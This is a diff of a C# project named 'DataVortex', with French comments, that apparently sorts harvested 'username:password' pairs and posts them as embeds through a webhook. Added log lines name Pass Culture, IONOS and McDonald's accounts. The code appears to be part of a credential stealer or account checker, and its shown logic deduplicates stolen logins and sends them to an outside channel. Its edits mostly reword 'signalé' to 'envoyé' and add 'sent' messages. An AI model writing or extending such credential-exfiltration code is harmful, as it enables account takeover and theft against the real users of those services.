@@ -86,11 +86,11 @@ namespace DataVortex
                             {
                                 string accountIdentifier = $"{result.username}:{result.password}";
 
-                                // Vérifiez si le compte a déjà été signalé
+                                // Vérifiez si le compte a déjà été envoyé
                                 if (ReportedAccounts.Contains(accountIdentifier))
                                 {
                                     Console.ForegroundColor = ConsoleColor.Magenta;
-                                    Console.WriteLine($"Le compte {accountIdentifier} a déjà été signalé. Ignoré.");
+                                    Console.WriteLine($"Le compte {accountIdentifier} a déjà été envoyé. Ignoré.");
                                     Console.ResetColor();
                                     continue; // Passe au compte suivant
                                 }
@@ -102,7 +102,7 @@ namespace DataVortex
                                     Console.ResetColor();
                                     continue; // Passe au compte suivant
                                 }
-                                ReportedAccounts.Add(accountIdentifier); // Ajoutez le compte signalé à l'ensemble
+                                ReportedAccounts.Add(accountIdentifier); // Ajoutez le compte envoyé à l'ensemble
 
                                 // Recherchez les détails du compte correspondant
                                 var accountDetail = accountDetailsList.FirstOrDefault(details =>
@@ -131,6 +131,7 @@ namespace DataVortex
 
                                     // Envoyez le message via le webhook
                                     await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                                    Console.WriteLine("Embed Passculture envoyé");
                                 }
                             }
                         }
@@ -170,15 +171,15 @@ namespace DataVortex
                             {
                                 string resultString = $"{result.username}:{result.password}";
 
-                                // Vérifiez si le compte a déjà été signalé
+                                // Vérifiez si le compte a déjà été envoyé
                                 if (ReportedAccounts.Contains(resultString))
                                 {
                                     Console.ForegroundColor = ConsoleColor.Magenta;
-                                    Console.WriteLine($"Le compte {resultString} a déjà été signalé. Ignoré.");
+                                    Console.WriteLine($"Le compte {resultString} a déjà été envoyé. Ignoré.");
                                     Console.ResetColor();
                                     continue; // Passe au compte suivant
                                 }
-                                ReportedAccounts.Add(resultString); // Ajoutez le compte signalé à l'ensemble
+                                ReportedAccounts.Add(resultString); // Ajoutez le compte envoyé à l'ensemble
 
                                 if (!uniqueResults.Contains(resultString))
                                 {
@@ -196,6 +197,7 @@ namespace DataVortex
 
                             // Send the message via the webhook
                             await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                            Console.WriteLine("Embed ionos envoyé");
                         }
                     }
                 }
@@ -229,7 +231,7 @@ namespace DataVortex
                             {
                                 string resultString = $"{result.username}:{result.password}";
 
-                                // Vérifiez si le compte a déjà été signalé
+                                // Vérifiez si le compte a déjà été envoyé
                                 if (ReportedAccounts.Contains(resultString))
                                 {
                                     Console.ForegroundColor = ConsoleColor.Magenta;
@@ -237,7 +239,7 @@ namespace DataVortex
                                     Console.ResetColor();
                                     continue; // Passe au compte suivant
                                 }
-                                ReportedAccounts.Add(resultString); // Ajoutez le compte signalé à l'ensemble
+                                ReportedAccounts.Add(resultString); // Ajoutez le compte envoyé à l'ensemble
 
                                 if (!uniqueResults.Contains(resultString))
                                 {
@@ -255,6 +257,7 @@ namespace DataVortex
 
                             // Send the message via the webhook
                             await client.SendMessageAsync(embeds: new[] { embed.Build() });
+                            Console.WriteLine("Embed Mcdo envoyé");
                         }
                     }
                 }
